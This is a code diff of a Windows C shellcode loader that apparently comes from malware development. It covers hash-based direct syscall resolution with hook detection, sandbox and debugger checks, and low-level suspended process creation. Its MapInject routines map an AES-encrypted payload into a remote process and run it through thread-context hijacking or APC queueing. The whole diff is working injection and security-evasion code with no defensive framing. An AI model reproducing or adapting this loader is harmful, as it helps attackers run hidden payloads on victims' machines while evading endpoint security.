@@ -115,7 +115,7 @@ BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
         
         if (HashStringDjb2a_Ascii(pcFnName) == dwSysHash) {
 
-           // myprintf("\nfound a hash match %s \n" , pcFnName);
+           // //myprintf("\nfound a hash match %s \n" , pcFnName);
 
             pNtSys->pFuncAddress = pFunctionAddress;
             // if not hooked 
@@ -131,7 +131,7 @@ BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
 
                 pNtSys->pSyscallAddress = (PBYTE)pFunctionAddress + 0x12;
                 ////printf("address of syscall to %s is 0x%p \n" , pcFnName , syscallAddress);
-                //myprintf("\nfunction %s Not hocked \n" , pcFnName);
+                ////myprintf("\nfunction %s Not hocked \n" , pcFnName);
                 break;
             }
             //if hooked check the neighborhood to find clean syscall
@@ -141,7 +141,7 @@ BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
                 *((PBYTE)pFunctionAddress) == 0xe9 || *((PBYTE)pFunctionAddress + 3) == 0xe9 || *((PBYTE)pFunctionAddress + 8) == 0xe9 || *((PBYTE)pFunctionAddress + 10) == 0xe9
                 )
             {
-                //my//printf("Func %s Is Hooked \n " , pcFnName);
+                myprintf("Func %s Is Hozozzkezd \n " , pcFnName);
                 for (WORD i = 1; i <= 500; i++) {
                     if (*((PBYTE)pFunctionAddress + i * DOWN) == 0x4c
                         && *((PBYTE)pFunctionAddress + 1 + i * DOWN) == 0x8b
@@ -290,6 +290,14 @@ BOOL InitSyscakk() {
         ////printf("failed to  initialize ntquerysysteminfo \n ");
         return FALSE;
     }
+    if (!FitchNtSyscall(NTSETCONTEXTTHREADhash, &sys_func.NtSetContextThread)) {
+        ////printf("failed to  initialize ntquerysysteminfo \n ");
+        return FALSE;
+    }
+    if (!FitchNtSyscall(NTGETCONTEXTTHREADhash, &sys_func.NtGetContextThread)) {
+        ////printf("failed to  initialize ntquerysysteminfo \n ");
+        return FALSE;
+    }
    
     return TRUE;
 }
@@ -364,90 +372,90 @@ VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR So
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 
 
-//BOOL CreateProcLowLevel(IN PWSTR ProcPath, IN  PWSTR pwCommandLine, IN  PWSTR pwCurrentDir, OUT PHANDLE phProc, OUT PHANDLE phThread) {
-//    if (!ProcPath) {
-//        myprintf("ProcPath is Null \n");
-//        return FALSE;
-//    }
-//    fnRtlCreateProcessParametersEx pRtlCreateProcessParameters = (fnRtlCreateProcessParametersEx)FitchNonSyscalls(RtlCreateProcessParametersExHash);
-//    if (!pRtlCreateProcessParameters) {
-//        myprintf("pRtlCreateProcessParameters function pointer not found \n");
-//        return FALSE;
-//    }
-//    //my//printf("pRtlCreateProcessParameters is at 0x%p \n", pRtlCreateProcessParameters);
-//    BOOL res = FALSE;
-//    NTSTATUS state = 0x00;
-//    PPS_ATTRIBUTE_LIST pAttributeList = NULL;
-//    PRTL_USER_PROCESS_PARAMETERS pUserProcParameters = NULL;
-//    PWCHAR pwDuplicateStr = NULL;
-//    UNICODE_STRING usProcessPath = { 0 };
-//    UNICODE_STRING usCommandLine = { 0 };
-//    UNICODE_STRING usCurrentDirectoy = { 0 };
-//
-//    PWCHAR	pwcDuplicateStr = NULL,
-//        pwcLastSlash = NULL,
-//        pszNtProcessPath = NULL,
-//        pszFullProcessParm = NULL;
-//
-//
-//    //pUserProcParameters->ShowWindowFlags = SW_HIDE;
-//
-//
-//    DWORD64  dw64BlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-//
-//    // initialize Process attributes 
-//
-//    pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (2 * sizeof(PS_ATTRIBUTE) + sizeof(PPS_ATTRIBUTE_LIST)));
-//    if (!pAttributeList) {
-//        //my//printf("Failed to allocate heap for pAttributeList \n");
-//        return FALSE;
-//    }
-//
-//   /* myprintf("pAttributeList is at 0x%p \n" , (PVOID)pAttributeList);*/
-//
-//
-//    RtlInitUnicodeString(&usProcessPath, ProcPath);
-//    //myprintf("first rtl done \n");
-//    RtlInitUnicodeString(&usCommandLine, pwCommandLine);
-//    RtlInitUnicodeString(&usCurrentDirectoy, pwCurrentDir);
-//
-//    //myprintf("third rtl done \n");
-//
-//    state = pRtlCreateProcessParameters(&pUserProcParameters, &usProcessPath, NULL, &usCurrentDirectoy, &usCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
-//    if (state != 0x00) {
-//        myprintf("RtlCreateProcParameters Failed with %x \n", state);
-//        return FALSE;
-//    }
-//    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
-//    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
-//    pAttributeList->Attributes[0].Size = usProcessPath.Length;
-//    pAttributeList->Attributes[0].Value = (ULONG_PTR)usProcessPath.Buffer;
-//
-//    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
-//    pAttributeList->Attributes[1].Size = sizeof(DWORD64);
-//    pAttributeList->Attributes[1].Value = &dw64BlockDllPolicy;
-//    //myprintf("pAttributeList Done \n");
-//    PS_CREATE_INFO pCreateInfo = { 0 };
-//
-//    // we need to initialize 2 elements in PS_CREATE_INFO struct (size , state )
-//    pCreateInfo.Size = sizeof(PS_CREATE_INFO);
-//    pCreateInfo.State = PsCreateInitialState;
-//    //myprintf("pCreateInfo Done \n");
-//    SET_SYSCALL(sys_func.NtCreateUserProcess);
-//    state = RedroExec(phProc, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pUserProcParameters, &pCreateInfo, pAttributeList);
-//    if (state != 0x00) {
-//        //myprintf("NtCreateUserProcess Failed with 0x%X\n", state);
-//        return FALSE;
-//    }
-//    //myprintf("NtCreate  Done \n");
-//    HeapFree(GetProcessHeap(), 0, pAttributeList);
-//    if (*phProc == NULL || *phThread == NULL) {
-//        myprintf("common faileur in process creation the handle is null \n ");
-//        return FALSE;
-//    }
-//    myprintf("hthr in cpll is 0x%p \n" , *phThread);
-//    return TRUE;
-//}
+BOOL CreateProcLowLevel(IN PWSTR ProcPath, IN  PWSTR pwCommandLine, IN  PWSTR pwCurrentDir, OUT PHANDLE phProc, OUT PHANDLE phThread) {
+    if (!ProcPath) {
+        //myprintf("ProcPath is Null \n");
+        return FALSE;
+    }
+    fnRtlCreateProcessParametersEx pRtlCreateProcessParameters = (fnRtlCreateProcessParametersEx)FitchNonSyscalls(RtlCreateProcessParametersExHash);
+    if (!pRtlCreateProcessParameters) {
+        //myprintf("pRtlCreateProcessParameters function pointer not found \n");
+        return FALSE;
+    }
+    //my//printf("pRtlCreateProcessParameters is at 0x%p \n", pRtlCreateProcessParameters);
+    BOOL res = FALSE;
+    NTSTATUS state = 0x00;
+    PPS_ATTRIBUTE_LIST pAttributeList = NULL;
+    PRTL_USER_PROCESS_PARAMETERS pUserProcParameters = NULL;
+    PWCHAR pwDuplicateStr = NULL;
+    UNICODE_STRING usProcessPath = { 0 };
+    UNICODE_STRING usCommandLine = { 0 };
+    UNICODE_STRING usCurrentDirectoy = { 0 };
+
+    PWCHAR	pwcDuplicateStr = NULL,
+        pwcLastSlash = NULL,
+        pszNtProcessPath = NULL,
+        pszFullProcessParm = NULL;
+
+
+    //pUserProcParameters->ShowWindowFlags = SW_HIDE;
+
+
+    DWORD64  dw64BlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+    // initialize Process attributes 
+
+    pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (2 * sizeof(PS_ATTRIBUTE) + sizeof(PPS_ATTRIBUTE_LIST)));
+    if (!pAttributeList) {
+        //my//printf("Failed to allocate heap for pAttributeList \n");
+        return FALSE;
+    }
+
+   /* //myprintf("pAttributeList is at 0x%p \n" , (PVOID)pAttributeList);*/
+
+
+    RtlInitUnicodeString(&usProcessPath, ProcPath);
+    ////myprintf("first rtl done \n");
+    RtlInitUnicodeString(&usCommandLine, pwCommandLine);
+    RtlInitUnicodeString(&usCurrentDirectoy, pwCurrentDir);
+
+    ////myprintf("third rtl done \n");
+
+    state = pRtlCreateProcessParameters(&pUserProcParameters, &usProcessPath, NULL, &usCurrentDirectoy, &usCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+    if (state != 0x00) {
+        //myprintf("RtlCreateProcParameters Failed with %x \n", state);
+        return FALSE;
+    }
+    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
+    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    pAttributeList->Attributes[0].Size = usProcessPath.Length;
+    pAttributeList->Attributes[0].Value = (ULONG_PTR)usProcessPath.Buffer;
+
+    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
+    pAttributeList->Attributes[1].Size = sizeof(DWORD64);
+    pAttributeList->Attributes[1].Value = &dw64BlockDllPolicy;
+    ////myprintf("pAttributeList Done \n");
+    PS_CREATE_INFO pCreateInfo = { 0 };
+
+    // we need to initialize 2 elements in PS_CREATE_INFO struct (size , state )
+    pCreateInfo.Size = sizeof(PS_CREATE_INFO);
+    pCreateInfo.State = PsCreateInitialState;
+    ////myprintf("pCreateInfo Done \n");
+    SET_SYSCALL(sys_func.NtCreateUserProcess);
+    state = RedroExec(phProc, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, pUserProcParameters, &pCreateInfo, pAttributeList);
+    if (state != 0x00) {
+        ////myprintf("NtCreateUserProcess Failed with 0x%X\n", state);
+        return FALSE;
+    }
+    ////myprintf("NtCreate  Done \n");
+    HeapFree(GetProcessHeap(), 0, pAttributeList);
+    if (*phProc == NULL || *phThread == NULL) {
+        //myprintf("common faileur in process creation the handle is null \n ");
+        return FALSE;
+    }
+    //myprintf("hthr in cpll is 0x%p \n" , *phThread);
+    return TRUE;
+}
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
     /*@TODO
@@ -470,8 +478,8 @@ VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR So
 
 
 BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pInjectionLocation ) {
-    if (isSandboxed()) {
-        myprintf("No sandbox detected, continuing execution...\n");
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
     }
     HANDLE hSection = NULL; 
@@ -480,7 +488,12 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     NTSTATUS state = 0x00;
     SIZE_T sViewSize = 0x00;
     SIZE_T bytesWritten = 0;
+    PBYTE pRemoteAddress = NULL;
+    PBYTE pLocalAddress = NULL;
 
+    if (ChekDebug()) {
+        return -1;
+    }
     if (!hProcess) {
         return FALSE;
     }
@@ -491,10 +504,13 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
 //    decode_shellcode(shellcode);
     /*for (int i = 0; i < 10; i++) {
-        myprintf(" 0x%X , " , EncryptedShellcode[i]);
+        //myprintf(" 0x%X , " , EncryptedShellcode[i]);
     }*/
     SIZE_T buff_size = sizeof(EncryptedShellcode);
-
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
     /*OBJECT_ATTRIBUTES oa  ;
     CLIENT_ID cid; */
 
@@ -504,50 +520,68 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     SET_SYSCALL(sys_func.NtOpenProcess);
     NTSTATUS state = RedroExec(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
     if (state != 0x00) {
-        myprintf("\nFailed with : 0x%X \n", state);
+        //myprintf("\nFailed with : 0x%X \n", state);
         return -1;
     }
-    myprintf("\nproc  is 0x%p \n", hProcess);
+    //myprintf("\nproc  is 0x%p \n", hProcess);
     
     */
     
-    if (isSandboxed()) {
-        myprintf("No sandbox detected, continuing execution...\n");
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
     }
 
     
     PLARGE_INTEGER sSectionSize = sizeof(EncryptedShellcode);
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+
+   /* SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
+    state = RedroExec((HANDLE)-1, &pLocalAddress, 0, &sBuffSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (state != 0x00) {
+        myprintf("\nNtAllocateVirtualMemory Failed : 0x%X \n", state);
+        return -1;
+    }*/
 
     SET_SYSCALL(sys_func.NtCreateSection);
     state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (state != 0x00) {
-        myprintf("\nFailed to create koko 0x%X\n", state);
+        myprintf("\nFailed to create soso 0x%X\n", state);
+        return -1;
+    }
+    if (ChekDebug()) {
         return -1;
     }
     myprintf("\n created koko with hoho 0x%p\n", hSection);
 
-    PBYTE pLocalAddress = NULL;
+    
     
 
     SET_SYSCALL(sys_func.NtMapViewOfSection);
-    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_READWRITE);
     if (state != 0x00) {
-        myprintf("\nMapppping Failed : 0x%X \n", state);
+        myprintf("\nMappzpzpzizng Failed : 0x%X \n", state);
         return -1;
     }
+    SharedSleep(2 * 1000);
     myprintf("Our Local View : 0x%p \n", pLocalAddress);
 
-    /*SET_SYSCALL(sys_func.NtMapViewOfSection);
-    state = RedroExec(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sBuffSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    SET_SYSCALL(sys_func.NtMapViewOfSection);
+    state = RedroExec(hSection, hProcess, &pRemoteView, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
     if (state != 0x00) {
-        myprintf("\nMapppping REmo Failed : 0x%X \n", state);
+        //myprintf("\nMapppping REmo Failed : 0x%X \n", state);
         return -1;
     }
-    myprintf("Our Remote View : 0x%p \n", pRemoteAddress);*/
+    myprintf("Our Remote View : 0x%p \n", pRemoteView);
     
     
-    
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
     if (!BruteForceDecryptionKey(AESKey, 32))
         return FALSE;
 
@@ -556,32 +590,38 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     if (!BruteForceDecryptionIV(AESIv, 16))
         return FALSE;
 
-    SharedSleep(4 * 1000);
+    SharedSleep(2 * 1000);
     //decode_shellcode(shellcode);
     if (EncryptedShellcode == NULL) {
         //MessageBoxA(NULL, "EnCryptedShellcode is NULL !", "Dummy_Bear", MB_OK);
-        //myprintf("EncryptedShellcode is NULL \n");
+        myprintf("encoo is NULL \n");
         return FALSE;
     }
-    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sBuffSize, AESKey, AESIv, &pLocalAddress)) {
+    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sSectionSize, AESKey, AESIv, &pLocalAddress)) {
         //MessageBoxA(NULL, "InstallAesDecryptionViaCtAes Failed !", "Dummy_Bear", MB_OK);
+        return FALSE;
+    }
+
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
     }
     myprintf("done install decro \n");
     //SET_SYSCALL(sys_func.NtUnMapViewOfSection);
     //if ((state = RedroExec((HANDLE)-1, pLocalAddress)) != 0x00) {
     //    //MessageBoxA(NULL, "UnMapping  Failed ! ", "Dummy_Bear", MB_OK);
-    //    myprintf("Ntunmap  Failed with error : 0x%X \n", state);
+    //    //myprintf("Ntunmap  Failed with error : 0x%X \n", state);
     //    return FALSE;
     //}
 
-    ////myprintf("unmapped cur proc at address 0x%p \n\n", pLocalAddress);
+    //////myprintf("unmapped cur proc at address 0x%p \n\n", pLocalAddress);
     //pLocalAddress = NULL;
     
     // change the permisions 
-  /*  PULONG oldProtect = NULL;
+    /*ULONG oldProtectVal;
+    PULONG oldProtect = &oldProtectVal;
     SET_SYSCALL(sys_func.NtProtectVirtualMemory);
-    if ((state = RedroExec(hProcess , &pLocalAddress , &sBuffSize , PAGE_EXECUTE_READWRITE , oldProtect)) != 0x00) {
+    if ((state = RedroExec((HANDLE)-1, &pLocalAddress, &sBuffSize, PAGE_EXECUTE_READ, oldProtect)) != 0x00) {
         myprintf("protect failed 0x%X \n" , state);
         return FALSE;
     
@@ -592,46 +632,52 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
 
 
     // create suspended thread
+    //HANDLE hNewThread = NULL;
 
-    /*SET_SYSCALL(sys_func.NtCreateThreadEx);
-    if ((state = RedroExec(&hThread , THREAD_ALL_ACCESS , NULL , hProcess , pLocalAddress , NULL , TRUE , NULL , NULL , NULL , NULL )) != 0x00) {
-        myprintf("create thotho failed : 0x%X \n" , state);
-        return FALSE;
-    }
-    myprintf("created thotho with hand 0x%p \n" , hThread);*/
-    SharedSleep(4 * 1000);
-    /*SET_SYSCALL(sys_func.NtQueueApcThread);
-    state = RedroExec((HANDLE)-2, pLocalAddress, NULL, NULL, NULL);
-    if (state != 0x00) {
-        myprintf("failed to queue : 0x%X \n" , state);
-        return FALSE;
-    }
+    //SET_SYSCALL(sys_func.NtCreateThreadEx);
+    //if ((state = RedroExec(&hNewThread, THREAD_ALL_ACCESS , NULL , hProcess , pRemoteView, NULL , THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER | THREAD_CREATE_FLAGS_CREATE_SUSPENDED, NULL , NULL , NULL , NULL )) != 0x00) {
+    //    //myprintf("create thotho failed : 0x%X \n" , state);
+    //    return FALSE;
+    //}
+    //myprintf("created thotho with hand 0x%p \n" , hNewThread);
+    //SharedSleep(2 * 1000);
+    //SET_SYSCALL(sys_func.NtQueueApcThread);
+    //state = RedroExec(hNewThread, pRemoteView, NULL, NULL, NULL);
+    //if (state != 0x00) {
+    //    //myprintf("failed to queue : 0x%X \n" , state);
+    //    return FALSE;
+    //}
     
     
-     myprintf("queue thr done\n");
+    /*myprintf("queue thr done\n");
     SET_SYSCALL(sys_func.NtSetInformationThread);
-    state = RedroExec((HANDLE)-2, 0x11 , NULL , NULL);
+    state = RedroExec(hNewThread, 0x11 , NULL , NULL);
     if (state != 0x00) {
         myprintf("setinfo failed : 0x%X\n" , state);
         return FALSE;
     }*/
+
     CONTEXT ctx; 
     ctx.ContextFlags = CONTEXT_ALL;
     
     
-    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)FitchNonSyscalls(NTSETCONTEXTTHREADhash);
-    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)FitchNonSyscalls(NTGETCONTEXTTHREADhash);
-    state = NtGetContextThread((HANDLE)-2 , &ctx);
+    /*pNtSetContextThread NtSetContextThread = (pNtSetContextThread)FitchNonSyscalls(NTSETCONTEXTTHREADhash);
+    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)FitchNonSyscalls(NTGETCONTEXTTHREADhash);*/
+
+    // Nt
+    SET_SYSCALL(sys_func.NtGetContextThread);
+    state = RedroExec(hThread , &ctx);
     if (state != 0x00) {
         myprintf("Get ctx failed 0x%X \n " , state);
         return FALSE;
     }
     SharedSleep(2 * 1000);
 
-    // Set RIP (EIP) to shellcode address
-    ctx.Rip = (DWORD64)pLocalAddress;
+    //// Set RIP (EIP) to shellcode address
+    ctx.Rip = (DWORD64)pRemoteView;
 
-    state = NtSetContextThread((HANDLE)-2 , &ctx);
+    SET_SYSCALL(sys_func.NtSetContextThread);
+    state = RedroExec(hThread , &ctx);
     if (state != 0x00) {
         myprintf("Set ctx failed 0x%X \n ", state);
         return FALSE;
@@ -639,23 +685,25 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
 
     /*SET_SYSCALL(sys_func.NtTestAlert);
     state = RedroExec();*/
-    /*SET_SYSCALL(sys_func.NtResumeThread);
-    state = RedroExec((HANDLE)-2, NULL);
+
+
+    SET_SYSCALL(sys_func.NtResumeThread);
+    state = RedroExec(hThread, NULL);
     if (state !=0x00) {
         myprintf("failed resume : 0x%X \n" , state);
         return FALSE;
     }
-    myprintf("resume thr done\n");*/
+    myprintf("resume thr done\n");
 
     /*SET_SYSCALL(sys_func.NtWaitForSingleObject);
     if ((state = RedroExec(hThread , FALSE , NULL)) != 0x00 ) {
-        myprintf("wait for ob failed 0x%X \n" , state);
+        //myprintf("wait for ob failed 0x%X \n" , state);
         return FALSE;
     
     }*/
-    //*pInjectionLocation = pRemoteView;
+    *pInjectionLocation = pRemoteView;
 
-    /*SET_SYSCALL(sys_func.NtClose);
+    SET_SYSCALL(sys_func.NtClose);
     state = RedroExec(hThread);
     SET_SYSCALL(sys_func.NtClose);
     state = RedroExec(hSection);
@@ -663,7 +711,7 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     if ((state = RedroExec(hProcess)) != 0x00) {
         myprintf("close failed : 0x%X \n" , state);
     }
-    myprintf("closed all hands \n");*/
+    myprintf("closed all hands \n");
     return TRUE;
 
 
@@ -672,51 +720,231 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
 
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
+BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pInjectionLocation) {
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+    HANDLE hSection = NULL;
+    PVOID pLocalView = NULL;
+    PVOID pRemoteView = NULL;
+    NTSTATUS state = 0x00;
+    SIZE_T sViewSize = 0x00;
+    SIZE_T bytesWritten = 0;
+    PBYTE pRemoteAddress = NULL;
+    PBYTE pLocalAddress = NULL;
+
+    if (ChekDebug()) {
+        return -1;
+    }
+    if (!hProcess) {
+        return FALSE;
+    }
+    //size_t shellSize = 80144;
+    //size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
+    //unsigned char* EncryptedShellcode = NULL;
+    size_t sBuffSize = sizeof(EncryptedShellcode);
+    //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
+//    decode_shellcode(shellcode);
+  
+    SIZE_T buff_size = sizeof(EncryptedShellcode);
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+  
+
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
 
 
-//wchar_t path[] = { 0x005C, 0x003F, 0x003F, 0x005C, 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065
-//};
-////wchar_t path2[] = L"\\??\\C:\\Windows\\System32\\calc.exe";
-//wchar_t command_line[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032, 0x005C, 0x0052, 0x0075, 0x006E, 0x0074, 0x0069, 0x006D, 0x0065, 0x0042, 0x0072, 0x006F, 0x006B, 0x0065, 0x0072, 0x002E, 0x0065, 0x0078, 0x0065, 0x0020, 0x002D, 0x0045, 0x006D, 0x0062, 0x0065, 0x0064, 0x0064, 0x0069, 0x006E, 0x0067, 0x0020
-//};
-//
-//wchar_t current_dir[] = { 0x0043, 0x003A, 0x005C, 0x0057, 0x0069, 0x006E, 0x0064, 0x006F, 0x0077, 0x0073, 0x005C, 0x0053, 0x0079, 0x0073, 0x0074, 0x0065, 0x006D, 0x0033, 0x0032
-//};
+    PLARGE_INTEGER sSectionSize = sizeof(EncryptedShellcode);
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+
+    
+
+    SET_SYSCALL(sys_func.NtCreateSection);
+    state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+    if (state != 0x00) {
+        myprintf("\nFailed to create soso 0x%X\n", state);
+        return -1;
+    }
+    if (ChekDebug()) {
+        return -1;
+    }
+    myprintf("\n created koko with hoho 0x%p\n", hSection);
+
+
+
+
+    SET_SYSCALL(sys_func.NtMapViewOfSection);
+    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_READWRITE);
+    if (state != 0x00) {
+        myprintf("\nMappzpzpzizng Failed : 0x%X \n", state);
+        return -1;
+    }
+    SharedSleep(2 * 1000);
+    myprintf("Our Local View : 0x%p \n", pLocalAddress);
+
+    SET_SYSCALL(sys_func.NtMapViewOfSection);
+    state = RedroExec(hSection, hProcess, &pRemoteView, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    if (state != 0x00) {
+        //myprintf("\nMapppping REmo Failed : 0x%X \n", state);
+        return -1;
+    }
+    myprintf("Our Remote View : 0x%p \n", pRemoteView);
+
+
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+    if (!BruteForceDecryptionKey(AESKey, 32))
+        return FALSE;
+
+    /*SharedSleep(4 * 1000);*/
+
+    if (!BruteForceDecryptionIV(AESIv, 16))
+        return FALSE;
+
+    SharedSleep(2 * 1000);
+    //decode_shellcode(shellcode);
+    if (EncryptedShellcode == NULL) {
+        //MessageBoxA(NULL, "EnCryptedShellcode is NULL !", "Dummy_Bear", MB_OK);
+        myprintf("encoo is NULL \n");
+        return FALSE;
+    }
+    if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sSectionSize, AESKey, AESIv, &pLocalAddress)) {
+        //MessageBoxA(NULL, "InstallAesDecryptionViaCtAes Failed !", "Dummy_Bear", MB_OK);
+        return FALSE;
+    }
+
+    if (ChekDebug()) {
+        //myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
+    myprintf("done install decro \n");
+    SET_SYSCALL(sys_func.NtUnMapViewOfSection);
+    if ((state = RedroExec((HANDLE)-1, pLocalAddress)) != 0x00) {
+        //MessageBoxA(NULL, "UnMapping  Failed ! ", "Dummy_Bear", MB_OK);
+        //myprintf("Ntunmap  Failed with error : 0x%X \n", state);
+        return FALSE;
+    }
+
+    myprintf("unmapped cur proc at address 0x%p \n\n", pLocalAddress);
+    pLocalAddress = NULL;
+
+    // start the execution 
+
+
+
+    // create suspended thread
+    //HANDLE hNewThread = NULL;
+
+    //SET_SYSCALL(sys_func.NtCreateThreadEx);
+    //if ((state = RedroExec(&hNewThread, THREAD_ALL_ACCESS , NULL , hProcess , pRemoteView, NULL , THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER | THREAD_CREATE_FLAGS_CREATE_SUSPENDED, NULL , NULL , NULL , NULL )) != 0x00) {
+    //    //myprintf("create thotho failed : 0x%X \n" , state);
+    //    return FALSE;
+    //}
+    //myprintf("created thotho with hand 0x%p \n" , hNewThread);
+    SharedSleep(2 * 1000);
+    SET_SYSCALL(sys_func.NtQueueApcThread);
+    state = RedroExec(hThread, pRemoteView, NULL, NULL, NULL);
+    if (state != 0x00) {
+        //myprintf("failed to queue : 0x%X \n" , state);
+        return FALSE;
+    }
+
+    SharedSleep(2 * 1000);
+    myprintf("queue thr done\n");
+    SET_SYSCALL(sys_func.NtSetInformationThread);
+    state = RedroExec(hThread, 0x11 , NULL , NULL);
+    if (state != 0x00) {
+        myprintf("setinfo failed : 0x%X\n" , state);
+        return FALSE;
+    }
+
+   
+    SET_SYSCALL(sys_func.NtResumeThread);
+    state = RedroExec(hThread, NULL);
+    if (state != 0x00) {
+        myprintf("failed resume : 0x%X \n", state);
+        return FALSE;
+    }
+    myprintf("resume thr done\n");
+
+    *pInjectionLocation = pRemoteView;
+
+    SET_SYSCALL(sys_func.NtClose);
+    state = RedroExec(hThread);
+    SET_SYSCALL(sys_func.NtClose);
+    state = RedroExec(hSection);
+    SET_SYSCALL(sys_func.NtClose);
+    if ((state = RedroExec(hProcess)) != 0x00) {
